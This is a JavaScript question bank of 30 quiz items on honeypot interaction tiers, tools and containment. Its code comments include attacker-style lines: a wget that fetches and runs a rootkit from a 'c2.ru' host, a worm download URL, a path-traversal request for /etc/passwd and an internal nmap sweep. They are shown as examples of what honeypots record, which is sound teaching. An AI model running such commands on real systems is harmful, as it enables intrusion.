const questions = [
  {
    id: 1,
    question: "What is the primary factor distinguishing Low-Interaction, Medium-Interaction, and High-Interaction honeypots?",
    shortAnswer: "The depth of interaction, operational freedom, and realism granted to the adversary—ranging from software-emulated command dictionaries (Low) to fully functional, un-emulated real operating system kernels (High).",
    explanation: "Low-interaction systems emulate network protocols and return canned responses. High-interaction systems provide real Linux or Windows environments where adversaries can install real rootkits and execute arbitrary shell commands.",
    hint: "How real the trap is: from fake simulated responses (Low) to a real operating system (High).",
    level: "Basic",
    codeExample: `// Honeypot Interaction Spectrum:
// Low-Interaction   : Fake SSH Daemon (Python script returns fake 'uname -a')
// Medium-Interaction: Simulated Web Application (Fake WordPress + SQL parser)
// High-Interaction  : Genuine Bare-Metal / VM Debian Linux Kernel with eBPF hooks`
  },
  {
    id: 2,
    question: "What is 'Cowrie' and what interaction tier does it represent in cyber deception?",
    shortAnswer: "A medium/low-interaction SSH and Telnet honeypot designed to log brute-force login attempts, record attacker terminal sessions, and capture downloaded malware files inside a fake virtual filesystem.",
    explanation: "Cowrie presents an authentic-looking SSH prompt. When attackers connect with credentials like `admin/admin`, Cowrie logs their keystrokes and saves any binaries they download via `wget` or `curl` into a quarantined folder.",
    hint: "A popular fake SSH honeypot that records keystrokes and saves downloaded malware files.",
    level: "Basic",
    codeExample: `// Cowrie Session Recording:
// Simulated Session: curl -s https://test-archive.local/sample.bin
// Cowrie Action: Downloads file to /var/lib/cowrie/downloads/ and logs SHA-256 hash!`
  },
  {
    id: 3,
    question: "What is 'Dionaea' and what specific protocol vulnerabilities is it designed to trap?",
    shortAnswer: "A low-interaction honeypot that emulates SMB (Port 445), MSSQL (Port 1433), FTP (Port 21), and HTTP to capture automated network worms, exploit payloads (e.g. EternalBlue), and malware binaries via simulated shellcode execution.",
    explanation: "Dionaea embeds Libemu, a fast x86 shellcode emulator. When an exploit hits its SMB port, Dionaea emulates the shellcode just enough to identify the malware download URL and carves the executable from the wire.",
    hint: "A honeypot designed to capture automated SMB worms like WannaCry and EternalBlue.",
    level: "Moderate",
    codeExample: `// Dionaea Libemu Shellcode Processing:
// Ingress Exploit: MS17-010 EternalBlue Buffer Overflow
// Libemu Action  : Unpacks shellcode ➔ Extracts Payload URL: http://bad.ru/worm.exe ➔ Saves Binary!`
  },
  {
    id: 4,
    question: "What is 'Conpot' and what critical infrastructure sectors rely on it for deception defense?",
    shortAnswer: "A low-interaction Industrial Control Systems (ICS / SCADA) honeypot that emulates Modbus, DNP3, BACnet, and Siemens S7comm protocols used in power grids, water purification plants, and smart cities.",
    explanation: "In environments like the Barrackpore electrical substation, Conpot emulates virtual programmable logic controllers (PLCs). Any adversary attempting to send unauthorized Modbus function codes trips an instant alert.",
    hint: "A fake factory and power grid honeypot that emulates industrial SCADA and PLC protocols.",
    level: "Basic",
    codeExample: `// Conpot SCADA Emulation:
// Protocol: Modbus TCP Port 502 | Target: Siemens S7-300 PLC (Emulated)
// Alert Trigger: Modbus Function Code 0x05 (Force Single Coil / Trip Circuit Breaker)`
  },
  {
    id: 5,
    question: "Why is a High-Interaction Honeypot considered the gold standard for discovering novel Zero-Day exploits and kernel rootkits?",
    shortAnswer: "Because it runs a genuine, un-emulated operating system kernel; attackers can compile custom C exploits, inject in-memory shellcode, and load kernel modules that would fail or crash on a low-interaction emulator.",
    explanation: "Low-interaction emulators only know existing commands. A high-interaction Linux kernel executes novel zero-day exploits faithfully, allowing kernel-level instrumentation (eBPF) to record the exact memory addresses and techniques used.",
    hint: "Because it is a real computer, novel zero-day viruses can run completely, allowing scientists to record them.",
    level: "Moderate",
    codeExample: `// High-Interaction Kernel Capture:
// Zero-Day Kernel Exploit (e.g. Dirty Pipe) executes on real kernel → eBPF records ring-0 privilege escalation in real time!`
  },
  {
    id: 6,
    question: "What is the primary operational security risk of deploying a High-Interaction Honeypot without proper containment?",
    shortAnswer: "The 'Attacker Pivot Risk': an adversary who obtains full root/administrator privileges on the honeypot can use it as a launchpad or proxy to attack real internal enterprise servers or external third parties.",
    explanation: "If an adversary compromises a real Windows server honeypot and the defender forgets to block outbound traffic, the hacker can use that server to launch ransomware attacks against other companies, creating massive legal liability.",
    hint: "The risk that a hacker uses your real trap server to attack other computers inside or outside your company.",
    level: "Basic",
    codeExample: `// The Pivot Hazard:
// Attacker compromises High-Interaction VM ➔ Executes: nmap -sS 10.10.1.0/24 (Attacking Real Production Servers!)`
  },
  {
    id: 7,
    question: "What is a 'Honeywall' (Honeynet Security Gateway) and what are its two foundational functions?",
    shortAnswer: "A specialized bridging firewall deployed directly in front of honeypots that performs: 1. Data Control (strictly rate-limiting and preventing outbound lateral pivots); 2. Data Capture (logging 100% of all ingress and egress packets invisibly).",
    explanation: "The Honeywall sits as a transparent Layer-2 bridge. It allows attackers to break into the honeypot but enforces strict limits (e.g. max 5 outbound packets per minute) to ensure the attacker cannot weaponize the honeypot against others.",
    hint: "A special gateway that traps hackers inside the honeypot and stops them from sending outbound attacks.",
    level: "Moderate",
    codeExample: `// Honeywall Data Control Rules:
// 1. Drop all outbound traffic to 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
// 2. Allow outbound internet traffic up to 10 connections/hour with TCP RST throttling`
  },
  {
    id: 8,
    question: "What is 'eBPF (Extended Berkeley Packet Filter)' in high-interaction honeypot kernel telemetry?",
    shortAnswer: "Running sandboxed programs inside the Linux kernel to trace system calls (`sys_enter_execve`, `sys_enter_connect`), recording every command, file write, and memory injection without installing detectable agent software in user space.",
    explanation: "Traditional user-space agents are easily detected and disabled by rootkits. eBPF runs invisibly at the kernel level, capturing keystrokes and network connections even if the attacker deletes bash history or replaces system binaries.",
    hint: "Invisible kernel tracking that records every hacker command without leaving any detectable software files.",
    level: "Expert",
    codeExample: `// eBPF Syscall Trace Hook:
// SEC("tracepoint/syscalls/sys_enter_execve")
// int trace_execve(struct trace_event_raw_sys_enter *ctx) {
//     bpf_printk("Attacker Executed: %s", ctx->args[0]);
// }`
  },
  {
    id: 9,
    question: "What is 'Honeyd' and how does it simulate entire virtual subnets with customizable OS personalities?",
    shortAnswer: "A small-footprint daemon that listens on thousands of unused IP addresses, simulating synthetic routing hops, ARP replies, and TCP/IP stack personalities (mimicking Cisco routers, Windows 10, or OpenBSD) using Nmap fingerprint databases.",
    explanation: "Honeyd creates the illusion of a massive enterprise datacenter. A single Linux server running Honeyd can present 50,000 distinct virtual IP addresses, confusing adversary scanners and diluting their reconnaissance efforts.",
    hint: "A tool that makes a single computer look like 50,000 different servers running Windows, Linux, and Cisco.",
    level: "Moderate",
    codeExample: `// Honeyd Configuration Snippet:
// create default
// set default personality "Cisco 7206VXR running IOS 12.4"
// add default tcp port 23 "/usr/share/honeyd/scripts/cisco-telnet.sh"`
  },
  {
    id: 10,
    question: "What is 'Glastopf / Snare & Tanner' in Medium-Interaction Web Application Deception?",
    shortAnswer: "A web honeypot that emulates thousands of common web vulnerabilities (SQLi, Local File Inclusion - LFI, Remote File Inclusion - RFI), returning dynamically generated fake HTML and database responses.",
    explanation: "When an automated bot searches for `index.php?page=../../etc/passwd`, Glastopf dynamically serves a fake `/etc/passwd` file, logging the attacker's IP and payload without exposing real server files.",
    hint: "A fake website honeypot that pretends to be vulnerable to SQL injection and file inclusion attacks.",
    level: "Moderate",
    codeExample: `// Glastopf LFI Response:
// Request: GET /index.php?file=../../../../etc/passwd
// Glastopf Response: "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin" (Fake Emulated Text)`
  },
  {
    id: 11,
    question: "Why are Low-Interaction Honeypots highly 'Fingerprintable' by experienced human hackers?",
    shortAnswer: "Because they rely on static command tables; if an attacker types an un-emulated command (e.g. `cat /proc/version`, `vmstat`, or complex bash pipe chaining `ps aux | grep root`), the emulator returns generic errors or crashes.",
    explanation: "Human hackers test edge cases. An emulator might reply to `ls` and `whoami`, but fails when the attacker runs `export TERM=xterm` or attempts to create a named FIFO pipe, instantly tipping off the intruder that it is a decoy.",
    hint: "Because fake emulators only know common commands and return errors on unusual or advanced commands.",
    level: "Basic",
    codeExample: `// Attacker Fingerprinting Test:
// Attacker types: cat /proc/sys/kernel/random/entropy_avail
// Low-Interaction: "bash: cat: /proc/sys/kernel/random/entropy_avail: No such file" → FAKE HONEYPOT DETECTED!`
  },
  {
    id: 12,
    question: "What is 'Sebek' in historical Honeynet research?",
    shortAnswer: "A kernel-level module installed inside high-interaction honeypots that intercepted system calls (like `read()` on `/dev/tty`) and secretly broadcast keystroke telemetry out-of-band via raw UDP packets.",
    explanation: "Developed by the Honeynet Project in the early 2000s, Sebek captured attacker passwords and commands even if the session was encrypted over SSH. Modern architectures replace Sebek with eBPF and hypervisor introspection.",
    hint: "An old kernel module that recorded keystrokes from inside high-interaction trap servers.",
    level: "Moderate",
    codeExample: `// Sebek Architecture:
// Keystroke on SSH ➔ [Sebek Kernel Driver intercepts read()] ➔ Sends encrypted UDP telemetry to Honeywall`
  },
  {
    id: 13,
    question: "What is 'Automated Snapshot Rollback' in High-Interaction Virtual Machine Honeypots?",
    shortAnswer: "Using hypervisor automation (KVM `virsh snapshot-revert` / VMware API) to automatically wipe the virtual disk and restore the honeypot to a clean, pre-compromise base state every 24 hours or after an attack completes.",
    explanation: "Once an attacker installs a rootkit or alters system files, the honeypot is contaminated. Automated rollback ensures that subsequent attacks land on a pristine environment, preventing cross-contamination.",
    hint: "Automatically rewinding the virtual machine back to a clean state after every hacker attack.",
    level: "Basic",
    codeExample: `// KVM Automated Rollback Script:
// virsh destroy honeypot-vm-01
// virsh snapshot-revert honeypot-vm-01 clean-golden-image
// virsh start honeypot-vm-01`
  },
  {
    id: 14,
    question: "What is 'Micro-VM / Firecracker Virtualization' for high-density High-Interaction deception?",
    shortAnswer: "Lightweight, secure KVM-based virtual machines with minimal 5MB memory footprints that boot in less than 100 milliseconds, allowing a single host to run thousands of isolated, genuine Linux kernels.",
    explanation: "Traditional VMs require 2GB of RAM and take 30 seconds to boot. Firecracker micro-VMs allow massive scaling of real operating systems, combining the realism of High-Interaction with the scale of Low-Interaction.",
    hint: "Ultra-tiny virtual machines that boot in 100 milliseconds, letting you run 1,000 real Linux traps on one server.",
    level: "Expert",
    codeExample: `// Firecracker Micro-VM Startup:
// Memory: 128 MB | Boot Time: 125ms | Isolation: Full Bare-Metal KVM Hardware Virtualization`
  },
  {
    id: 15,
    question: "What is 'Client Honeypots (Honeyclients / Monkey-Spider)' and how do they differ from Server Honeypots?",
    shortAnswer: "Server honeypots wait passively for incoming attacks; Client honeypots proactively crawl the web, browse suspicious URLs, and open email attachments using instrumented browsers to detect drive-by downloads and browser zero-days.",
    explanation: "A client honeypot visits 100,000 malicious websites per day. If a webpage exploits a browser vulnerability and writes an unauthorized `.exe` file to the hard drive, the honeyclient flags the malicious domain.",
    hint: "An automated fake browser that visits malicious websites to find dangerous drive-by download exploits.",
    level: "Moderate",
    codeExample: `// Honeyclient Crawl Loop:
// for url in malicious_feed:
//     headless_browser.navigate(url)
//     if file_system_integrity.has_unauthorized_drop():
//         flag_drive_by_zero_day(url)`
  },
  {
    id: 16,
    question: "How does 'Hardware Resource Sizing' differ between Low-Interaction and High-Interaction honeypots?",
    shortAnswer: "Low-Interaction honeypots require minimal resources (can run 10,000 instances on a single 16-core server); High-Interaction honeypots require dedicated RAM, CPU, and disk storage per VM (e.g. 2GB RAM per node), limiting scale to 20–50 VMs per host.",
    explanation: "Low-interaction daemons share a single lightweight process. High-interaction setups allocate real virtualization memory, meaning high-density deployments require significant RAM and NVMe storage capacity.",
    hint: "Low-interaction uses almost no memory; high-interaction needs real RAM and CPU for each virtual machine.",
    level: "Basic",
    codeExample: `// Resource Comparison:
// Low-Interaction (Cowrie): 5,000 Decoys = 8 GB RAM Total
// High-Interaction (VMs) : 50 Real Debian VMs = 128 GB RAM Total`
  },
  {
    id: 17,
    question: "What is 'Tarpitting (LaBrea / Sticky Honeypot)' in Low-Interaction defense?",
    shortAnswer: "Holding open incoming TCP connections from port scanners by setting the TCP Window Size to zero or 1 byte (`window: 0`), forcing the attacker's scanning threads to stall and freeze for hours.",
    explanation: "When an automated scanner hits an IP, the tarpit replies with a tiny TCP window and trickles ACK packets at 1 byte per 30 seconds. This exhausts the attacker's connection pool, grinding their port scan to a halt.",
    hint: "A sticky trap that holds open network connections very slowly, freezing and slowing down hacker scanners.",
    level: "Moderate",
    codeExample: `// TCP Tarpit Response:
// TCP Flags: SYN-ACK | Window Size: 0 bytes (Receiver Buffer Full) ➔ Attacker Thread Blocked!`
  },
  {
    id: 18,
    question: "What is 'Malware Sample Sandboxing' integration in High-Interaction Honeypots?",
    shortAnswer: "Automatically exporting any executable binary dropped by an attacker onto the honeypot to a dynamic analysis sandbox (e.g. Cuckoo Sandbox / CAPEv2) for automated behavioral execution and YARA rule generation.",
    explanation: "When an attacker drops a rootkit, the honeypot captures the binary, computes its SHA-256 hash, runs it inside an isolated sandbox, and automatically generates Snort rules and firewall blocks within minutes.",
    hint: "Automatically sending captured hacker files to a virtual lab to test what damage they do.",
    level: "Moderate",
    codeExample: `// Sandbox Detonation Pipeline:
// File Dropped in /tmp/malware.elf ➔ Auto-Submitted to CAPEv2 Sandbox ➔ Threat Report & YARA Signatures Generated`
  },
  {
    id: 19,
    question: "What is 'Decoy Active Directory Domain Controller' in High-Interaction Enterprise Deception?",
    shortAnswer: "A fully functional Windows Server VM configured as a replica Active Directory Domain Controller inside an isolated forest, populated with thousands of synthetic user accounts, Kerberos keys, and group policies.",
    explanation: "When advanced threat groups compromise an enterprise, their primary goal is obtaining NTDS.dit (the AD database). Directing them to a decoy Domain Controller keeps them occupied while capturing their exact privilege escalation TTPs.",
    hint: "A real fake Windows Domain Controller filled with fake employee accounts to trap advanced hackers.",
    level: "Expert",
    codeExample: `// Decoy Domain Controller Setup:
// Forest: corp-deception.local | Host: DC-DECOY-01 | Monitored with Microsoft Defender for Identity & Sysmon`
  },
  {
    id: 20,
    question: "What does 'Honey-Tokenizing the Local SAM Database' mean on High-Interaction Windows Honeypots?",
    shortAnswer: "Injecting fake local administrator password hashes (e.g. `NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0`) into the Windows Security Account Manager (SAM) and LSASS memory space.",
    explanation: "When attackers run Mimikatz to dump memory, they harvest the fake NTLM hashes. When they attempt to use those hashes for Pass-the-Hash attacks on real servers, the security system identifies the compromised host immediately.",
    hint: "Planting fake password hashes in memory so if a hacker steals them with Mimikatz, using them rings alarms.",
    level: "Expert",
    codeExample: `// LSASS Injection:
// Mimikatz dumps: User='svc_adm_trap', NTLM='A721...B8' ➔ Any Pass-the-Hash using 'A721...' triggers instant isolation!`
  },
  {
    id: 21,
    question: "How do 'Hypervisor Introspection (VMI)' tools monitor High-Interaction Honeypots from outside the guest OS?",
    shortAnswer: "Directly reading guest physical memory pages and CPU registers from the host hypervisor (using LibVMI / KVM), allowing full inspection of hidden malware processes even if the guest kernel is completely subverted by a ring-0 rootkit.",
    explanation: "If an advanced rootkit hooks the guest Linux kernel to hide its own processes from `ps aux`, hypervisor introspection sees raw physical RAM from outside the VM, exposing the hidden rootkit with 100% certainty.",
    hint: "Looking at the virtual computer's memory from the outside host so stealth rootkits cannot hide.",
    level: "Expert",
    codeExample: `// LibVMI Memory Inspection:
// vmi_read_addr_va(vmi, guest_cr3, target_addr, buffer) ➔ Uncovers hidden rootkit memory pages!`
  },
  {
    id: 22,
    question: "What is the primary role of 'Low-Interaction Honeypots' in Cloud Infrastructure (AWS / Azure / GCP)?",
    shortAnswer: "Serving as scalable, serverless micro-listeners (e.g. AWS Lambda running simulated SSH/HTTP endpoints) that generate zero false-alarm alerts when malicious IP sweeps hit cloud VPC subnets.",
    explanation: "Running heavy EC2 VMs 24/7 incurs cloud compute costs. Serverless low-interaction listeners cost virtually nothing to run and provide 100% high-fidelity alerting across hundreds of cloud subnets.",
    hint: "Using lightweight serverless scripts in the cloud to catch hackers for pennies per month.",
    level: "Basic",
    codeExample: `// AWS Lambda Serverless Honeypot:
// API Gateway (Port 443) ➔ Lambda checks payload ➔ Fires CloudWatch Alarm (Cost: ₹10/month)`
  },
  {
    id: 23,
    question: "What is 'Snare & Tanner' in modern web deception architectures?",
    shortAnswer: "Snare clones the visual design of real web pages (e.g. company login portal) and sends incoming web requests to Tanner, a centralized decision engine that evaluates whether the request is malicious and returns deceptive HTML.",
    explanation: "Snare provides the front-end deception, while Tanner analyzes payloads with multiple detection plugins (evaluating SQL injection, XSS, and command injection), centralizing web threat intelligence across multiple sensor nodes.",
    hint: "A web trap system that clones real company websites and uses a smart brain to study web attacks.",
    level: "Moderate",
    codeExample: `// Snare & Tanner Architecture:
// Attacker ──> [Snare Web Clone] ──(JSON API)──> [Tanner Decision Engine] ➔ Logs SQLi & Emulates Response`
  },
  {
    id: 24,
    question: "What is 'Multi-Stage Deception Escalation' from Low-Interaction to High-Interaction?",
    shortAnswer: "An architecture where a low-interaction honeypot handles initial scanning; if an attacker demonstrates sophisticated human interaction, the connection is dynamically proxied to a high-interaction real VM to observe deep exploitation.",
    explanation: "This hybrid approach combines the massive scale of low-interaction with the deep forensic capability of high-interaction, reserving expensive VM resources only for advanced, targeted threat actors.",
    hint: "Using a cheap fake trap first; if the hacker is a real expert, moving them into a real virtual machine trap.",
    level: "Expert",
    codeExample: `// Dynamic Proxy Escalation:
// Port Scan (Bot) ➔ Handled by Low-Interaction Daemon (Low Cost)
// Complex Zero-Day Exploit ➔ Proxied dynamically to High-Interaction Debian VM for deep kernel recording!`
  },
  {
    id: 25,
    question: "What is the CERT-In compliance requirement regarding High-Interaction Honeypot Sandboxing and Log Preservation?",
    shortAnswer: "All high-interaction honeypots must maintain strict egress isolation to prevent unauthorized relay attacks, and all captured packet pcaps, keystroke logs, malware hashes, and NPL India NTP timestamps must be preserved for 180 days.",
    explanation: "Under statutory cybersecurity directives, failure to contain a compromised honeypot exposes the enterprise to liability if the honeypot attacks external infrastructure. All forensic logs must be preserved for judicial review.",
    hint: "Strict outbound containment to prevent attacks on others, and 180-day retention of all captured logs.",
    level: "Basic",
    codeExample: `// Structured CERT-In High-Interaction Audit Log:
const certInHighInteractionLog = {
  timestamp: "2026-08-23T13:20:00.150Z",
  honeypotTier: "HIGH_INTERACTION_DEBIAN_VM",
  ebpfKeystrokeLog: "wget http://c2.ru/rootkit.elf; chmod +x rootkit.elf",
  honeywallEgressAction: "OUTBOUND_PIVOT_DROPPED",
  retentionDays: 180
};`
  },
  {
    id: 26,
    question: "What is 'Attacker Keystroke Timing Autocorrelation' extracted from High-Interaction SSH honeypots?",
    shortAnswer: "Measuring the exact millisecond delays between typed characters (`inter-keystroke timing`) to determine whether a human hacker is typing manually at a keyboard or an automated script is pasting commands.",
    explanation: "Human typing exhibits natural variable latency (100ms–300ms per character). Automated scripts deliver 50 characters in 1 millisecond. This biometric metric separates human cyber spies from automated botnets.",
    hint: "Measuring typing speed between letters to see if a human hacker is typing or a computer script is pasting.",
    level: "Expert",
    codeExample: `// Keystroke Timing Analysis:
// Timing = [120ms, 180ms, 95ms, 210ms] → Confirmed Live Human Hacker!
// Timing = [0.1ms, 0.1ms, 0.1ms, 0.1ms] → Automated Bot Script!`
  },
  {
    id: 27,
    question: "How does 'Network Address Translation (NAT) Routing' obscure the true location of High-Interaction Honeypot server farms?",
    shortAnswer: "Deploying the actual high-interaction VM cluster in a centralized secure datacenter, while routing traffic from distributed decoy IP addresses across remote branch subnets via GRE/IPsec tunnels.",
    explanation: "In a distributed organization (with offices in Barrackpore, Salt Lake, and Ichapur), all decoy IP traffic is tunneled back to a single centralized High-Interaction VM cluster, simplifying management and containment.",
    hint: "Tunneling traffic from remote fake IP addresses back to a secure central trap server room.",
    level: "Moderate",
    codeExample: `// Distributed Decoy Tunneling:
// Branch Office (10.10.8.50) ──[GRE Tunnel]──> Centralized High-Interaction Honeywall Cluster (172.16.1.10)`
  },
  {
    id: 28,
    question: "What is 'Honey-Tokens in Browser Local Storage / Session Storage' on High-Interaction Web Decoys?",
    shortAnswer: "Placing fake JSON Web Tokens (JWT) or session cookies inside browser storage; if an attacker uses cross-site scripting (XSS) or infostealer malware to extract and replay the token, an instant alert is dispatched.",
    explanation: "Infostealers (like RedLine or Lumma Stealer) harvest browser cookies. The planted canary session cookie contains a tracking identifier that flags the attacker's IP the moment they attempt to use it on the web portal.",
    hint: "Planting fake login cookies in browser storage to catch hackers using stolen cookie tools.",
    level: "Moderate",
    codeExample: `// Browser Canary Token:
// localStorage.setItem("auth_token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.canary_token_99182a");`
  },
  {
    id: 29,
    question: "What is 'Decoy Active Directory Group Policy (GPO)' deployed in High-Interaction Forests?",
    shortAnswer: "Creating fake Group Policy Objects with names like `Deploy_Executive_VPN_Certs` that distribute fake certificate files and decoy registry keys across virtual workstations to lure ransomware operators.",
    explanation: "Adversaries inspect GPOs to discover administrative deployment scripts. Finding the decoy GPO leads them to a honey-share, alerting defenders before real domain controllers are targeted.",
    hint: "Setting up fake Windows Group Policies that guide hackers into trap shares.",
    level: "Expert",
    codeExample: `// Decoy GPO Configuration:
// GPO Name: "Deploy_Corporate_Backup_Credentials" ➔ Points to Honey-Share \\\\dc-trap\\backups\\`
  },
  {
    id: 30,
    question: "Synthesize the architectural decision framework: When should a security architect deploy Low-Interaction vs High-Interaction Honeypots?",
    shortAnswer: "Deploy Low-Interaction Honeypots for broad, cost-effective internal subnet tripwires, automated worm capture, and zero-risk alert generation across thousands of IPs; deploy High-Interaction Honeypots with Honeywall containment in isolated DMZs for capturing zero-days, deep forensic research, and analyzing advanced human APT campaigns.",
    explanation: "A mature enterprise deception grid combines both: hundreds of lightweight low-interaction decoys blanket the internal VLANs to catch lateral movement, while a few high-interaction VMs are reserved for deep threat intelligence gathering in full compliance with CERT-In and the DPDP Act 2023.",
    hint: "Low-interaction for widespread, zero-risk alarms across all subnets; High-interaction for deep forensic study of expert hackers.",
    level: "Moderate",
    codeExample: `// The Master Deception Architecture:
// Internal Enterprise VLANs : [Hundreds of Low-Interaction Cowrie / Conpot / Honeyports (Zero Risk)]
// Isolated Research DMZ     : [High-Interaction Debian VM + eBPF Kernel Tracing + Honeywall Containment]`
  }
];

export default questions;
